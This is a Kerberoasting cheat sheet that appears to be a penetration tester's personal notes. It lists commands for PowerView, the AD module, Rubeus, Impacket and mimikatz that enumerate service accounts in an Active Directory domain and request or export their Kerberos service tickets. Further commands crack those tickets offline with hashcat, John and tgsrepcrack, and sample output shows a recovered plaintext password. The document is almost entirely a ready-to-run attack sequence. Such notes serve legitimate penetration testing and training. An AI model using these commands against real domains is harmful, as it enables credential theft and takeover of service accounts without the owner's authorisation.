# Kerberoasting
--------------------

PowerView:

```Powershell
Get-NetUser -SPN | select serviceprincipalname

Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat

Get-DomainSPNTicket -SPN "MSSQLSvc/xor-app23.xor.com:1433" -OutputFormat Hashcat
```

GetUserSPNs.ps1

https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1

```PowerShell
. .\GetUserSPNs.ps1

PS C:\> Add-Type -AssemblyName System.IdentityModel  
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/xor-app23.xor.com:1433"  


Id                   : uuid-f70ef09c-55e1-42a6-b21a-f722cbbdfdbf-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
                       y}
ValidFrom            : 4/8/2022 12:15:08 AM
ValidTo              : 4/8/2022 10:14:52 AM
ServicePrincipalName : MSSQLSvc/xor-app23.xor.com:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey 

# using mimikatz
kerberos::list /export
[00000008] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 4/7/2022 5:15:08 PM ; 4/8/2022 3:14:52 AM ; 4/14/2022 5:14:52 PM
   Server Name       : MSSQLSvc/xor-app23.xor.com:1433 @ XOR.COM
   Client Name       : xor-app59$ @ XOR.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
   * Saved to file     : 8-40a10000-xor-app59$@MSSQLSvc~xor-app23.xor.com~1433-XOR.COM.kirbi
```

Cracking kirbi tickets

```bash
python3 /opt/kerberoast/tgsrepcrack.py /opt/rockyou.txt 8-40a10000-xor-app59\$@MSSQLSvc\~xor-app23.xor.com\~1433-XOR.COM.kirbi 

/opt/john/run/kirbi2john.py 8-40a10000-xor-app59\$@MSSQLSvc\~xor-app23.xor.com\~1433-XOR.COM.kirbi > forjohn 

john --wordlist=/opt/rockyou.txt forjohn --format=krb5tgs
shantewhite      ($krb5tgs$unknown)     
```

AD Module:

```Powershell
import-module active directory

get-aduser -ldapfilter "(serviceprincipalname=*)" -Properites "serviceprincipalname"
```

Rubeus:

```cmd
.\Rubeus.exe kerberoast /outfile:ticket  #will print all kerberoastable accounts with ticket to a file.
```

Impacket:

```bash
python3 /opt/wintools/impacket/examples/GetUserSPNs.py vulnnet-rst.local/t-skid -dc-ip 10.10.251.139 -request
```

Cracking:

```cmd
hashcat.exe -m 13100 "ticket" rockyou.txt
```

```bash
john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
```